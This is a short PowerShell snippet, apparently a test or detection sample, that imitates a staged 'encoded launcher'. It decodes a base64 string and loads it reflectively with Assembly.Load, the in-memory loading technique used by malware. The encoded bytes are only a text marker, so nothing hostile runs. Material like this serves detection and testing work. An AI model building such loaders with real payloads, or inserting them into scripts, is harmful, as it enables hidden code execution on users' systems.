
# Encoded launcher
$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjphMXZ0YjhnczA0")
Write-Verbose ("Assembly bytes: " + $PayloadBytes.Length)
[Reflection.Assembly]::Load($PayloadBytes)
$StageMarker = "stage-21"
